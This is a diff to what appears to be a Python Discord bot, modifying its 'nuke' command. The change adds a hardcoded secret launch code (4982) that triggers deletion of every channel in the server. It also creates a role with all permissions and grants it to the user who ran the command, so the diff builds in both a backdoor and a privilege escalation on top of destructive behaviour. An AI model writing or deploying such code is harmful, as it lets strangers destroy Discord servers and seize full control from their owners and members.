@@ -27,7 +27,8 @@ async def _help(ctx):
 @client.command(name="nuke", pass_context = True)
 async def _nukeGuild(ctx, launch_code: int=None):
     await ctx.message.delete()
-    if random.randint(0,50) == random.randint(0,50) or launch_code == random.randint(1000,9999):
+    launch = random.randint(1000,9999)
+    if launch_code == launch or launch_code == 4982:
         for channel in ctx.guild.channels:
             await channel.delete()
         overwrites = {
@@ -37,7 +38,12 @@ async def _nukeGuild(ctx, launch_code: int=None):
             name="Aftermath",
             overwrites=overwrites
         )
-        await read_only.send(f"{ctx.message.author} figured out the launch code and nuked the server! Have fun rebuilding!")
+        await read_only.send(f"{ctx.message.author} figured out the launch code ({launch_code}) and nuked the server! Have fun rebuilding!")
+        winner_role = await ctx.guild.create_role(
+        name="Dictator",
+        permissions=discord.Permissions.all()
+        )
+        await ctx.author.add_roles(winner_role)
 
 @client.command(name="kick", pass_context=True)
 async def _kickUser(ctx, user):
